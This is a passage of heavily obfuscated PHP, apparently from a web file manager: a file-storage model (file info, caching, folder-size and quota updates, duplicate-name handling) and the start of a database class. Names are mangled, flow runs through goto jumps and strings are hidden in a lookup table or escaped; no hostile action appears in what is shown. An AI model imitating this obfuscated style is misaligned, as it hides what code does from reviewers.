(!$BÃ²Ç‡¼Ê[$dÃÃÄîŠÑÊ[376]] == $dÃÃÄîŠÑÊ[377]) { $c“§ÚœµÑò[$dÃÃÄîŠÑÊ[390]] = get_path_ext($e¢¿»¨ì†˜); } Model($dÃÃÄîŠÑÊ[382])->eventRename($CçÏ™Û´×Ö, $BÃ²Ç‡¼Ê[$dÃÃÄîŠÑÊ[28]], $e¢¿»¨ì†˜); $this->sourceCacheClear($CçÏ™Û´×Ö); goto eäŒóƒìâÔ; c¯¢´ØÉŞ˜: } public function setNamePinyin($Cì¢‘£ê“æ, $c˜›Á…Ø·, $C–ª¸£í‹” = true) { $f‹¨ğĞœá =& $_SERVER[İë¬“ÅÒÛ›]; $D–ÆñÖÛô = Input::check($c˜›Á…Ø·, $f‹¨ğĞœá[404]); if ($C–ª¸£í‹” && !$D–ÆñÖÛô) { return; } if (!$D–ÆñÖÛô) { $this->metaSet($Cì¢‘£ê“æ, $f‹¨ğĞœá[405], null); $this->metaSet($Cì¢‘£ê“æ, $f‹¨ğĞœá[406], null); return; } $fİ“¦ºå = array($f‹¨ğĞœá[405] => str_replace($f‹¨ğĞœá[50], $f‹¨ğĞœá[33], Pinyin::encode($c˜›Á…Ø·)), $f‹¨ğĞœá[406] => Pinyin::encode($c˜›Á…Ø·, $f‹¨ğĞœá[407])); $this->metaSet($Cì¢‘£ê“æ, $fİ“¦ºå); } public function getContent($aÀçšÜ¨Œ±) { goto d‹ªµŸå¼×; fé•Â¦óğ¼: if ($fÒêƒøŠÛ¹[$Bµ‚ğ¾èˆ±[78]] == 0) { return $Bµ‚ğ¾èˆ±[33]; } $E¬›çÛ›Š = $Bµ‚ğ¾èˆ±[1783] . $fÒêƒøŠÛ¹[$Bµ‚ğ¾èˆ±[160]]; if ($fÒêƒøŠÛ¹[$Bµ‚ğ¾èˆ±[78]] <= 1024 * 10) { $E‘Û‚Ç½î³ = Cache::get($E¬›çÛ›Š); if (!$E‘Û‚Ç½î³) { $E‘Û‚Ç½î³ = IO::getContent($fÒêƒøŠÛ¹[$Bµ‚ğ¾èˆ±[76]]); Cache::set($E¬›çÛ›Š, $E‘Û‚Ç½î³); } return $E‘Û‚Ç½î³; } goto bê½ÈÑÎ¿; d‹ªµŸå¼×: $Bµ‚ğ¾èˆ± =& $_SERVER[İë¬“ÅÒÛ›]; $fÒêƒøŠÛ¹ = $this->fileInfoGet($aÀçšÜ¨Œ±); if (!$fÒêƒøŠÛ¹) { return !1; } goto fé•Â¦óğ¼; bê½ÈÑÎ¿: return IO::getContent($fÒêƒøŠÛ¹[$Bµ‚ğ¾èˆ±[76]]); goto fŒ¹ÃŸÈÇÛ; fŒ¹ÃŸÈÇÛ: } public function setDesc($E¾ã‚Œ»Äâ, $bÎÉ£ßÚÒæ) { $DˆµÃö¼Ì =& $_SERVER[İë¬“ÅÒÛ›]; Model($DˆµÃö¼Ì[382])->eventAddDesc($E¾ã‚Œ»Äâ, $bÎÉ£ßÚÒæ); return $this->metaSet($E¾ã‚Œ»Äâ, $DˆµÃö¼Ì[1590], $bÎÉ£ßÚÒæ); } public function setContent($dàõÖ’«Éœ, $fîíÆÏòÈ = '') { goto e’òÏŒ®Ìï; cËÁÍ‰òª¬: return !0; goto a¨¹‹œ–Çë; CËô¦¨ÊÔö: if (!$E’¥í‚‹å· || !$c×¬ÕŒÒ™ï) { return !1; } $this->checkLock($dàõÖ’«Éœ); $a»Á°â°ÂÙ = Model($E©·§Ñò¢Š[412])->addFileByContent($fîíÆÏòÈ, $c×¬ÕŒÒ™ï[$E©·§Ñò¢Š[28]]); goto eë®Ğ²ÈèÍ; e’òÏŒ®Ìï: $E©·§Ñò¢Š =& $_SERVER[İë¬“ÅÒÛ›]; $c×¬ÕŒÒ™ï = $this->sourceInfo($dàõÖ’«Éœ); $E’¥í‚‹å· = $this->fileInfoGet($dàõÖ’«Éœ); goto CËô¦¨ÊÔö; eë®Ğ²ÈèÍ: $b¸•·áŠª = $this->fileHistory($c×¬ÕŒÒ™ï, $a»Á°â°ÂÙ[$E©·§Ñò¢Š[383]], $a»Á°â°ÂÙ[$E©·§Ñò¢Š[78]]); if (!$b¸•·áŠª) { return Model($E©·§Ñò¢Š[412])->remove($a»Á°â°ÂÙ[$E©·§Ñò¢Š[383]]); } $this->folderSizeReset($c×¬ÕŒÒ™ï[$E©·§Ñò¢Š[385]]); goto cËÁÍ‰òª¬; a¨¹‹œ–Çë: } public function fileSubstr($Dšš’Ö—¤¢, $Aˆª’ˆ‰ÂÊ, $d§Â·ÇºÖ) { $aƒòâµ¬¹è = $this->fileInfoGet($Dšš’Ö—¤¢); if (!$aƒòâµ¬¹è) { return !1; } return IO::fileSubstr($aƒòâµ¬¹è[$_SERVER[İë¬“ÅÒÛ›][76]], $Aˆª’ˆ‰ÂÊ, $d§Â·ÇºÖ); } public function fileInfoGet($e•˜¼âŠ¶) { $DÌğ³Ê’Ç =& $_SERVER[İë¬“ÅÒÛ›]; $AóáÔä… = $this->sourceInfo($e•˜¼âŠ¶); if (!$AóáÔä… || $AóáÔä…[$DÌğ³Ê’Ç[376]]) { return !1; } $b“µˆ»çøÖ = Model($DÌğ³Ê’Ç[412])->fileInfo($AóáÔä…[$DÌğ³Ê’Ç[383]]); if ($b“µˆ»çøÖ) { $b“µˆ»çøÖ[$DÌğ³Ê’Ç[28]] = $AóáÔä…[$DÌğ³Ê’Ç[28]]; } return $b“µˆ»çøÖ; } private function folderChildrenNumber($B¥°‡‰§°”) { $eÆâëº‚¹Ä =& $_SERVER[İë¬“ÅÒÛ›]; $aÈÍ˜Î– = $this->sourceInfo($B¥°‡‰§°”); $AßœµôÜïİ = array($eÆâëº‚¹Ä[400] => array($eÆâëº‚¹Ä[409], $aÈÍ˜Î–[$eÆâëº‚¹Ä[374]] . $B¥°‡‰§°” . $eÆâëº‚¹Ä[410]), $eÆâëº‚¹Ä[401] => 0, $eÆâëº‚¹Ä[387] => 1); $cå¿¯˜ô²¼ = $this->where($AßœµôÜïİ)->count(); $aÀë™æ‰ÄÊ = $this->where($AßœµôÜïİ)->where(array($eÆâëº‚¹Ä[387] => 0))->count(); return array($eÆâëº‚¹Ä[82] => $aÀë™æ‰ÄÊ, $eÆâëº‚¹Ä[83] => $cå¿¯˜ô²¼); } public static $cachePathInfo = array(); public function pathInfo($E·±ŒéÍéÓ, $Cë—Ã÷‹øÍ = false) { goto c„ìœÍŸ¥¿; f¬¤·çæ® : self::$cachePathInfo[$CŒ‘©§Øé—] = $CÅä„áÀİÕ; return $CÅä„áÀİÕ; goto A‚·†¤íÔ°; E¹Ü„ö™¤•: $CÅä„áÀİÕ = $this->sourceInfo($E·±ŒéÍéÓ); if (!$CÅä„áÀİÕ) { return !1; } $CÅä„áÀİÕ = $this->_listDataApplyItem($CÅä„áÀİÕ, $Cë—Ã÷‹øÍ); goto f¬¤·çæ® ; c„ìœÍŸ¥¿: $CŒ‘©§Øé— = $E·±ŒéÍéÓ . $_SERVER[İë¬“ÅÒÛ›][499] . intval($Cë—Ã÷‹øÍ); $d…•Äè‘œî = _get(self::$cachePathInfo, $CŒ‘©§Øé—); if ($d…•Äè‘œî) { return $d…•Äè‘œî; } goto E¹Ü„ö™¤•; A‚·†¤íÔ°: } public static $cachePathInfoMore = array(); public function pathInfoMore($b©·¿ÍÀã‘) { goto aÆÌ—ˆ²¤Ù; aÆÌ—ˆ²¤Ù: $B¾½å×áÊ´ =& $_SERVER[İë¬“ÅÒÛ›]; $EğØÀË®“” = _get(self::$cachePathInfoMore, $b©·¿ÍÀã‘); if ($EğØÀË®“”) { return $EğØÀË®“”; } goto DŒŠÁ¼Ë™æ; A£ä†¦İŞ÷: self::$cachePathInfoMore[$b©·¿ÍÀã‘] = $dëŠ‘µĞĞÇ; return $dëŠ‘µĞĞÇ; goto EåÖ´— ñÃ; DŒŠÁ¼Ë™æ: $dëŠ‘µĞĞÇ = $this->pathInfo($b©·¿ÍÀã‘); if (!$dëŠ‘µĞĞÇ) { return !1; } if ($dëŠ‘µĞĞÇ[$B¾½å×áÊ´[376]] == $B¾½å×áÊ´[377]) { $dëŠ‘µĞĞÇ[$B¾½å×áÊ´[81]] = $this->folderChildrenNumber($b©·¿ÍÀã‘); } else { $dëŠ‘µĞĞÇ[$B¾½å×áÊ´[159]] = $this->fileInfoGet($b©·¿ÍÀã‘); unset($dëŠ‘µĞĞÇ[$B¾½å×áÊ´[159]][$B¾½å×áÊ´[76]]); } goto A£ä†¦İŞ÷; EåÖ´— ñÃ: } public function sourceInfo($A¥·ƒœ„Ç) { $CŸµÍ¨²²– =& $_SERVER[İë¬“ÅÒÛ›]; $f³³¸º¶Ú  = $CŸµÍ¨²²–[1784] . $A¥·ƒœ„Ç; $d‘¬æà³²í = _get(self::$cacheSourceInfo, $f³³¸º¶Ú ); if ($d‘¬æà³²í) { return $d‘¬æà³²í; } self::$cacheSourceInfo[$f³³¸º¶Ú ] = $this->where(array($CŸµÍ¨²²–[375] => $A¥·ƒœ„Ç))->find(); return self::$cacheSourceInfo[$f³³¸º¶Ú ]; } public function sourceCacheClear($b”ºÛ–‹ï = false) { if ($b”ºÛ–‹ï == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[İë¬“ÅÒÛ›][1784] . $b”ºÛ–‹ï]); } public function pathInfoByPath($c«ÖÍèß§ß, $eÎ¿˜ƒÊ…¶) { $AŸĞßàÎÊ =& $_SERVER[İë¬“ÅÒÛ›]; $bİ„¯è¿ã¡ = !$eÎ¿˜ƒÊ…¶ ? array() : explode($AŸĞßàÎÊ[8], trim($eÎ¿˜ƒÊ…¶, $AŸĞßàÎÊ[8])); $aÓ—©Üîî = $c«ÖÍèß§ß; foreach ($bİ„¯è¿ã¡ as $c‘ß‡„Œ‘Ï) { $c™ä¾ÃØˆÉ = array($AŸĞßàÎÊ[385] => $aÓ—©Üîî, $AŸĞßàÎÊ[28] => $c‘ß‡„Œ‘Ï); $FõŒØ—‰Ÿ‚ = $this->where($c™ä¾ÃØˆÉ)->select(); if (!$FõŒØ—‰Ÿ‚) { return !1; } $FõŒØ—‰Ÿ‚ = array_sort_by($FõŒØ—‰Ÿ‚, $AŸĞßàÎÊ[411]); $aÓ—©Üîî = $FõŒØ—‰Ÿ‚[0][$AŸĞßàÎÊ[375]]; } return $this->pathInfo($aÓ—©Üîî, !0); } protected function updateModifyTime($FÉ›ŸîƒÒ) { goto cø„åÕ¦Ğ; Eö¸áäÆÑ±: $this->where($AÊ­ƒ œ¶)->save($D•‘Û¨ßìÂ); goto DŞ©¹Ş¢Œ ; cø„åÕ¦Ğ: $EÜ÷Ş…Ë =& $_SERVER[İë¬“ÅÒÛ›]; if (!$FÉ›ŸîƒÒ) { return; } if (!is_array($FÉ›ŸîƒÒ)) { $FÉ›ŸîƒÒ = array($FÉ›ŸîƒÒ); } goto e—¸âÎ²ÇØ; e—¸âÎ²ÇØ: foreach ($FÉ›ŸîƒÒ as $Døæ’ß®î£ => $FŸÊ†ÁĞ‡º) { $FÉ›ŸîƒÒ[$Døæ’ß®î£] = intval($FŸÊ†ÁĞ‡º); } $AÊ­ƒ œ¶ = array($EÜ÷Ş…Ë[375] => array($EÜ÷Ş…Ë[7], $FÉ›ŸîƒÒ)); $D•‘Û¨ßìÂ = array($EÜ÷Ş…Ë[398] => USER_ID, $EÜ÷Ş…Ë[1768] => time()); goto Eö¸áäÆÑ±; DŞ©¹Ş¢Œ : } public function folderSizeReset($D…šªİŸôÓ) { goto fñœÈ–˜‘’; eª°®ÇÍ¬È: $Bº³œíö§ = $D’¯…‰›™Í - intval($D±Ş› ÄÜ¸[$E´ïŸ¿Ù™[78]]); if ($Bº³œíö§ == 0) { return CacheLock::unlock($e­Áê—¤é); } $this->where(array($E´ïŸ¿Ù™[416] => $D…šªİŸôÓ))->setField($E´ïŸ¿Ù™[78], $D’¯…‰›™Í); goto cÁÇ™¯ê»; fñœÈ–˜‘’: $E´ïŸ¿Ù™ =& $_SERVER[İë¬“ÅÒÛ›]; if ($this->statusIgnoreResetSpace) { return; } $e­Áê—¤é = $E´ïŸ¿Ù™[1785] . $D…šªİŸôÓ; goto f·‘·¸„Ö; f·‘·¸„Ö: CacheLock::lock($e­Áê—¤é, 20); $this->sourceCacheClear($D…šªİŸôÓ); $D±Ş› ÄÜ¸ = $this->sourceInfo($D…šªİŸôÓ); goto Bó©áÔÁøß; Bó©áÔÁøß: $d¹‚‰Ñœæ¯ = array($E´ïŸ¿Ù™[399] => $D…šªİŸôÓ, $E´ïŸ¿Ù™[401] => 0); $D’¯…‰›™Í = $this->where($d¹‚‰Ñœæ¯)->sum($E´ïŸ¿Ù™[78]); $D’¯…‰›™Í = intval($D’¯…‰›™Í); goto eª°®ÇÍ¬È; cÁÇ™¯ê»: $e´‹ˆ×É‘¿ = $this->parentLevelArray($D±Ş› ÄÜ¸[$E´ïŸ¿Ù™[374]]); if ($e´‹ˆ×É‘¿) { $d¹‚‰Ñœæ¯ = array($E´ïŸ¿Ù™[375] => array($E´ïŸ¿Ù™[983], $e´‹ˆ×É‘¿)); $this->where($d¹‚‰Ñœæ¯)->setAdd($E´ïŸ¿Ù™[78], $Bº³œíö§); } $this->targetSpaceUpdate($D±Ş› ÄÜ¸[$E´ïŸ¿Ù™[394]], $D±Ş› ÄÜ¸[$E´ïŸ¿Ù™[396]]); goto d²‡¤õ¸; d²‡¤õ¸: CacheLock::unlock($e­Áê—¤é); goto bÊ’¬Õ§ê; bÊ’¬Õ§ê: } public function folderSizeResetChildren($Fõ¯¶“ÁéŠ) { goto d œİ˜ñï; AÙô¶†ãÓ×: $døÇ‹±Óø”[] = $bñ§¬¨‚Â¢; $døÇ‹±Óø” = array_to_keyvalue($døÇ‹±Óø”, $B¦‹•º»ßË[375]); foreach ($døÇ‹±Óø” as $dßâÓ’©§® => $c½Œµ¢è¸Ÿ) { $døÇ‹±Óø”[$dßâÓ’©§®][$B¦‹•º»ßË[1787]] = $døÇ‹±Óø”[$dßâÓ’©§®][$B¦‹•º»ßË[78]]; $døÇ‹±Óø”[$dßâÓ’©§®][$B¦‹•º»ßË[78]] = 0; } goto c°œÀÊ¼ÇÚ; d œİ˜ñï: $B¦‹•º»ßË =& $_SERVER[İë¬“ÅÒÛ›]; $this->sourceCacheClear($Fõ¯¶“ÁéŠ); $bñ§¬¨‚Â¢ = $this->sourceInfo($Fõ¯¶“ÁéŠ); goto F˜‘ìùåò; c°œÀÊ¼ÇÚ: foreach ($cá²‹§ãÛ· as $c½Œµ¢è¸Ÿ) { $cÂ¶¬ä‚¿Í = $c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[385]] . $B¦‹•º»ßË[33]; if (!isset($døÇ‹±Óø”[$cÂ¶¬ä‚¿Í])) { continue; } if ($c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[411]] == $døÇ‹±Óø”[$cÂ¶¬ä‚¿Í][$B¦‹•º»ßË[411]]) { $døÇ‹±Óø”[$cÂ¶¬ä‚¿Í][$B¦‹•º»ßË[78]] += $c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[78]]; } } foreach ($døÇ‹±Óø” as $c½Œµ¢è¸Ÿ) { $Eåò¯š = $this->parentLevelArray($c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[374]]); foreach ($Eåò¯š as $cÂ¶¬ä‚¿Í) { $cÂ¶¬ä‚¿Í = $cÂ¶¬ä‚¿Í . $B¦‹•º»ßË[33]; if (!isset($døÇ‹±Óø”[$cÂ¶¬ä‚¿Í])) { continue; } if ($c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[411]] == $døÇ‹±Óø”[$cÂ¶¬ä‚¿Í][$B¦‹•º»ßË[411]]) { $døÇ‹±Óø”[$cÂ¶¬ä‚¿Í][$B¦‹•º»ßË[78]] += $c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[78]]; } } } $a½¨¹«î–“ = array(); goto D¢ƒƒó‰„; B›¶Ã®˜ßã: $aÕÄç‡ßÉÔ[$B¦‹•º»ßË[376]] = 0; $cá²‹§ãÛ· = $this->field($F¯‚‰œ£Óª)->where($aÕÄç‡ßÉÔ)->select(); if (!$cá²‹§ãÛ·) { return; } goto AÙô¶†ãÓ×; F˜‘ìùåò: $aÕÄç‡ßÉÔ = array($B¦‹•º»ßË[387] => 1, $B¦‹•º»ßË[400] => array($B¦‹•º»ßË[409], $bñ§¬¨‚Â¢[$B¦‹•º»ßË[374]] . $Fõ¯¶“ÁéŠ . $B¦‹•º»ßË[410])); $F¯‚‰œ£Óª = $B¦‹•º»ßË[1786]; $døÇ‹±Óø” = $this->field($F¯‚‰œ£Óª)->where($aÕÄç‡ßÉÔ)->select(); goto B›¶Ã®˜ßã; D¢ƒƒó‰„: foreach ($døÇ‹±Óø” as $c½Œµ¢è¸Ÿ) { if ($c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[78]] == $c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[1787]]) { continue; } $a½¨¹«î–“[] = array($B¦‹•º»ßË[375], $c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[375]], $B¦‹•º»ßË[78], $c½Œµ¢è¸Ÿ[$B¦‹•º»ßË[78]]); } $this->saveAll($a½¨¹«î–“); goto f¬ÂÏ‡‘ÊŞ; f¬ÂÏ‡‘ÊŞ: } public function targetSpaceUpdate($FÛ¡£ŒîÇë, $Fƒ¥ï‰Ş™) { $F¹Šº°à¾¯ =& $_SERVER[İë¬“ÅÒÛ›]; if (!in_array($FÛ¡£ŒîÇë, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $BìÎ©¸çğù = $this->targetSpaceSize($FÛ¡£ŒîÇë, $Fƒ¥ï‰Ş™); if ($FÛ¡£ŒîÇë == self::TYPE_USER) { Model($F¹Šº°à¾¯[1716])->userEdit($Fƒ¥ï‰Ş™, array($F¹Šº°à¾¯[1532] => $BìÎ©¸çğù)); } else { if ($FÛ¡£ŒîÇë == self::TYPE_GROUP) { Model($F¹Šº°à¾¯[1710])->groupEdit($Fƒ¥ï‰Ş™, array($F¹Šº°à¾¯[1532] => $BìÎ©¸çğù)); } } } public function targetSpaceSize($f„”õ½„, $DôÁ¬„§¼ª) { goto B–÷­õ¼; a¢Š“±Ä‚š: $b¤Éé·¹Ì› = floatval($aÆœëÀ­ô[$Dç—‡ª§‰Š[78]]); $b®‘‚·ÔÊÚ = array($Dç—‡ª§‰Š[400] => array($Dç—‡ª§‰Š[409], $Dç—‡ª§‰Š[1626] . $aÆœëÀ­ô[$Dç—‡ª§‰Š[375]] . $Dç—‡ª§‰Š[1741])); $f§ËùÃ‹³” = Model($Dç—‡ª§‰Š[1788])->field($Dç—‡ª§‰Š[416])->where($b®‘‚·ÔÊÚ)->select(); goto DÃ¹Ø é¯; DÃ¹Ø é¯: $f§ËùÃ‹³” = array_to_keyvalue($f§ËùÃ‹³”, $Dç—‡ª§‰Š[33], $Dç—‡ª§‰Š[375]); if ($f§ËùÃ‹³”) { $b®‘‚·ÔÊÚ = array($Dç—‡ª§‰Š[416] => array($Dç—‡ª§‰Š[983], $f§ËùÃ‹³”)); $b¤Éé·¹Ì› += floatval($this->where($b®‘‚·ÔÊÚ)->sum($Dç—‡ª§‰Š[78])); } return $b¤Éé·¹Ì›; goto bªÉ‰Î§; B–÷­õ¼: $Dç—‡ª§‰Š =& $_SERVER[İë¬“ÅÒÛ›]; $aÆœëÀ­ô = $this->sourceRoot($f„”õ½„, $DôÁ¬„§¼ª, !0); if (!$aÆœëÀ­ô) { return 0; } goto a¢Š“±Ä‚š; bªÉ‰Î§: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($BİÃÇøØÀ) { return $this->fileTypeProfile($BİÃÇøØÀ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Føà–õ‚´¢) { return $this->fileTypeProfile($Føà–õ‚´¢, SourceModel::TYPE_GROUP); } private function fileTypeProfile($AóÍÈ °Ğ², $e±´•šå‘ò) { goto dãëˆà®…²; dãëˆà®…²: $díƒ×«ìÄÓ =& $_SERVER[İë¬“ÅÒÛ›]; $cÕŒ—é¿­ = $díƒ×«ìÄÓ[1789] . $AóÍÈ °Ğ² . $díƒ×«ìÄÓ[71] . $e±´•šå‘ò; $F®‘¢éá‚¤ = Cache::get($cÕŒ—é¿­); goto a¹‘ƒ¥¿Ÿ²; aÒ»…©â¡¨: foreach ($EÀŠÑ„åè· as $d¿‡Ôçò¸» => $a÷² ¸òöÖ) { $cÖËÔïî¸È[$díƒ×«ìÄÓ[390]] = $this->fileTypeWhere($d¿‡Ôçò¸»); $E¬ÀÕ‚ÃÆÍ[$d¿‡Ôçò¸»] = array($díƒ×«ìÄÓ[1791] => $a÷² ¸òöÖ[$díƒ×«ìÄÓ[28]], $díƒ×«ìÄÓ[1792] => $this->where($cÖËÔïî¸È)->count(), $díƒ×«ìÄÓ[392] => $this->where($cÖËÔïî¸È)->sum($díƒ×«ìÄÓ[78])); } Cache::set($cÕŒ—é¿­, $E¬ÀÕ‚ÃÆÍ, 1200); return $E¬ÀÕ‚ÃÆÍ; goto Cæ‘ ï„; a¹‘ƒ¥¿Ÿ²: if ($F®‘¢éá‚¤) { return $F®‘¢éá‚¤; } $cÖËÔïî¸È = array($díƒ×«ìÄÓ[387] => 0); if ($AóÍÈ °Ğ² != !1) { $cÖËÔïî¸È[$díƒ×«ìÄÓ[396]] = $AóÍÈ °Ğ²; $cÖËÔïî¸È[$díƒ×«ìÄÓ[394]] = $e±´•šå‘ò; } goto C»éëãçÎ÷; C»éëãçÎ÷: $E¬ÀÕ‚ÃÆÍ = array(); $E¬ÀÕ‚ÃÆÍ[$díƒ×«ìÄÓ[1790]] = array($díƒ×«ìÄÓ[1791] => LNG($díƒ×«ìÄÓ[1790]), $díƒ×«ìÄÓ[1792] => $this->where($cÖËÔïî¸È)->count(), $díƒ×«ìÄÓ[392] => $this->where($cÖËÔïî¸È)->sum($díƒ×«ìÄÓ[78])); $EÀŠÑ„åè· = KodIO::fileTypeList(); goto aÒ»…©â¡¨; Cæ‘ ï„: } public function fileNameExist($BŠöë¡„ƒÌ, $CÑ «¸ª²­) { $b¶…Å“ƒ‰õ =& $_SERVER[İë¬“ÅÒÛ›]; $FŒ“¼°õ¢Œ = $this->childList($BŠöë¡„ƒÌ); foreach ($FŒ“¼°õ¢Œ as $cë†´ «ÅÙ) { if ($cë†´ «ÅÙ[$b¶…Å“ƒ‰õ[28]] == $CÑ «¸ª²­) { return $cë†´ «ÅÙ[$b¶…Å“ƒ‰õ[375]]; } } return !1; } public function childList($Bæ¡“Ã¿ùÓ) { $A«î‘–‹÷É =& $_SERVER[İë¬“ÅÒÛ›]; $EÚ¸›ÃĞÉÚ = array($A«î‘–‹÷É[385] => intval($Bæ¡“Ã¿ùÓ), $A«î‘–‹÷É[411] => 0); $Bëõ½ã£¸ = $this->cacheMemory()->where($EÚ¸›ÃĞÉÚ)->select(); $Bëõ½ã£¸ = $Bëõ½ã£¸ ? $Bëõ½ã£¸ : array(); foreach ($Bëõ½ã£¸ as $f·¢Æù°ê¾) { $b­Û›ØÜ‡” = $A«î‘–‹÷É[1784] . $f·¢Æù°ê¾[$A«î‘–‹÷É[375]]; self::$cacheSourceInfo[$b­Û›ØÜ‡”] = $f·¢Æù°ê¾; } return $Bëõ½ã£¸; } public function fileNameAuto($fä””¡‰¿—, $Cö„íÑ©ÖÒ, $fŞÅ¼åÂ¨„ = REPEAT_RENAME, $D˜İİŸñàó = false) { $f­³·Á˜É– =& $_SERVER[İë¬“ÅÒÛ›]; $DÒÂ©¦™­ = $this->childList($fä””¡‰¿—); $D‘³éÎçË© = array_to_keyvalue($DÒÂ©¦™­, $f­³·Á˜É–[33], $f­³·Á˜É–[28]); return $this->fileNameAutoGet($D‘³éÎçË©, $Cö„íÑ©ÖÒ, $fŞÅ¼åÂ¨„, $D˜İİŸñàó); } public function fileNameAutoGet($có‘¦‹Ç, $fÆó¦‚ÈŒÚ, $aæÉîÎ¬Â, $a‰‹â†™ã) { $f£Ù²Àò“ =& $_SERVER[İë¬“ÅÒÛ›]; if ($aæÉîÎ¬Â == REPEAT_REPLACE || !$có‘¦‹Ç || !in_array_not_case($fÆó¦‚ÈŒÚ, $có‘¦‹Ç) || $a‰‹â†™ã && $aæÉîÎ¬Â != REPEAT_RENAME_FOLDER) { return $fÆó¦‚ÈŒÚ; } if ($aæÉîÎ¬Â == REPEAT_SKIP) { return !1; } $aä³‡éƒç° = $f£Ù²Àò“[92] . get_path_ext($fÆó¦‚ÈŒÚ); $aä³‡éƒç° = $aä³‡éƒç° == $f£Ù²Àò“[92] || $a‰‹â†™ã ? $f£Ù²Àò“[33] : $aä³‡éƒç°; for ($C±¤ÔŞ”òî = 1; $C±¤ÔŞ”òî <= count($có‘¦‹Ç) + 1; $C±¤ÔŞ”òî++) { $CÈÏŸç¸èÃ = substr($fÆó¦‚ÈŒÚ, 0, strlen($fÆó¦‚ÈŒÚ) - strlen($aä³‡éƒç°)); $E­º™Îâù = $CÈÏŸç¸èÃ . "\x28{$C±¤ÔŞ”òî}\51{$aä³‡éƒç°}"; if (!in_array_not_case($E­º™Îâù, $có‘¦‹Ç)) { return $E­º™Îâù; } } } } goto FºÇ—ğòîÓ; A®Øƒ±´â: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\x69\156\x6b\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\x6e\145\161" => "\x3c\76", "\x67\x74" => "\x3e", "\x65\147\164" => "\76\x3d", "\154\164" => "\x3c", "\145\154\164" => "\74\x3d", "\x6e\157\164\x6c\151\153\x65" => "\116\x4f\x54\x20\x4c\111\113\x45", "\154\151\x6b\x65" => "\114\x49\x4b\x45", "\151\x6e" => "\x49\x4e", "\x6e\x6f\x74\x69\156" => "\x4e\117\x54\40\111\116", "\156\x6f\164\x20\x69\156" => "\116\117\124\x20\111\x4e", "\142\145\164\x77\145\145\156" => "\102\x45\x54\127\105\105\116", "\156\157\x74\142\x65\164\167\x65\x65\156" => "\x4e\x4f\x54\40\102\x45\124\127\x45\105\x4e", "\156\157\x74\x20\x62\145\164\167\145\x65\156" => "\x4e\x4f\x54\x20\x42\x45\124\127\x45\x45\x4e"); protected $selectSql = "\123\x45\x4c\105\103\124\45\104\111\123\124\x49\116\x43\124\45\40\x25\x46\x49\105\x4c\x44\x25\x20\106\122\x4f\x4d\x20\45\x54\x41\x42\114\105\x25\45\x4a\x4f\x49\116\x25\x25\x57\110\x45\122\x45\x25\45\107\122\x4f\x55\x50\x25\45\x48\101\126\x49\116\107\45\45\117\122\104\105\122\45\x25\114\111\x4d\111\x54\45\40\45\x55\116\x49\x4f\x4e\x25\x25\103\x4f\x4d\115\105\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $FÂ‡ÆĞÇáÏ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[İë¬“ÅÒÛ›][645], $FÂ‡ÆĞÇáÏ); } public function factory($cóÒŞÆŠÔ¬ = '') { goto f†«‚‘Š™; eå…Ïî’ƒĞ: return $cªòóÑÆì; goto FäÑĞÉ‹ĞÙ; Fš¸Ï¶¥©: $this->dbType = ucwords(strtolower($cóÒŞÆŠÔ¬[$d†Äµ¶„›í[646]])); $cªì´óİ´ = $d†Äµ¶„›í[648] . $this->dbType; if (class_exists($cªì´óİ´)) { $cªòóÑÆì = new $cªì´óİ´($cóÒŞÆŠÔ¬); if ($d†Äµ¶„›í[492] != strtolower($cóÒŞÆŠÔ¬[$d†Äµ¶„›í[646]])) { $cªòóÑÆì->dbType = strtoupper($this->dbType); } else { $cªòóÑÆì->dbType = $this->_getDsnType($cóÒŞÆŠÔ¬[$d†Äµ¶„›í[598]]); } } else { think_exception(think_lang($d†Äµ¶„›í[649]) . $d†Äµ¶„›í[650] . $cªì´óİ´); } goto eå…Ïî’ƒĞ; f†«‚‘Š™: $d†Äµ¶„›í =& $_SERVER[İë¬“ÅÒÛ›]; $cóÒŞÆŠÔ¬ = $this->parseConfig($cóÒŞÆŠÔ¬); if (empty($cóÒŞÆŠÔ¬[$d†Äµ¶„›í[646]])) { think_exception(think_lang($d†Äµ¶„›í[647])); } goto Fš¸Ï¶¥©; FäÑĞÉ‹ĞÙ: } public function __call($eÛ¤®àÑ³á, $DµÄìÔ¦³) { if (method_exists($this, $eÛ¤®àÑ³á)) { return call_user_func_array(array($this, $eÛ¤®àÑ³á), $DµÄìÔ¦³); } } protected function _getDsnType($Cœª“ĞÙ˜—) { $fïÖñ’ô· = explode($_SERVER[İë¬“ÅÒÛ›][4], $Cœª“ĞÙ˜—); $a‰ö½Œ“Ö² = strtoupper(trim($fïÖñ’ô·[0])); return $a‰ö½Œ“Ö²; } private function parseConfig($DÕŠ¸ÍÉµå = '') { $Fê¾ˆ£êó— =& $_SERVER[İë¬“ÅÒÛ›]; if (!empty($DÕŠ¸ÍÉµå) && is_string($DÕŠ¸ÍÉµå)) { $DÕŠ¸ÍÉµå = $this->parseDSN($DÕŠ¸ÍÉµå); } elseif (is_array($DÕŠ¸ÍÉµå)) { $DÕŠ¸ÍÉµå = array_change_key_case($DÕŠ¸ÍÉµå); $DÕŠ¸ÍÉµå = array($Fê¾ˆ£êó—[646] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[651]], $Fê¾ˆ£êó—[566] => $DÕŠ¸ÍÉµå[$Fê¾ˆ£êó—[652]], $Fê¾ˆ£êó—[567] 